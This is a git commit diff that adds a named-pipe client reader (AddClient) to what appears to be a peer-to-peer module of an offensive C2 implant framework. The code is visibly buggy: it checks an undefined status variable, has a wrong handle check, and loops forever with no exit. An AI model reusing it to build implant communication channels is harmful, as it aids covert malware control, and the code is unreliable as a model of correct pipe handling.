89ed8e0c2218d0a67db76909cdfa5b080f6e472e
1emvr <1emvr@protonmail.com>
2024-08-18 05:07:21 -0400

    updateing p2p

--- core/src/clients.cpp
+++ core/src/clients.cpp
@@ -1,11 +1,56 @@
 #include <core/include/clients.hpp>
 namespace Clients {
 
+    BOOL AddClient(wchar_t *pipe_name) {
+        HEXANE
+
+        _stream *in     = { };
+        void *handle    = { };
+        void *buffer    = { };
+
+        uint32_t total  = 0;
+        uint32_t read   = 0;
+        bool success    = true;
+
+        if (!(handle = Ctx->win32.CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
+            if (handle == INVALID_HANDLE_VALUE) {
+                success_(false);
+            }
+
+            else if (ntstatus == ERROR_PIPE_BUSY) {
+                if (!Ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
+                    success_(false);
+                }
+            }
+        }
+        do {
+            if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
+                if (total) {
+                    if (!(in = Stream::CreateStream()) || !(buffer = x_malloc(total))) {
+                        Ctx->nt.NtClose(handle);
+                        success_(false);
+                    }
+
+                    if (!Ctx->win32.ReadFile(handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
+                        Ctx->nt.NtClose(handle);
+                        success_(false);
+                    }
+
+                    in->buffer = buffer;
+                    in->length += total;
+                }
+            }
+        }
+        while (true);
+
+        defer:
+        return success;
+    }
+
     VOID PushClients() {
         HEXANE
 
         for (auto client = Ctx->clients; client; client = client->next) {
-            // just fucking send it...
 
             _stream *in     = { };
             void *buffer    = { };
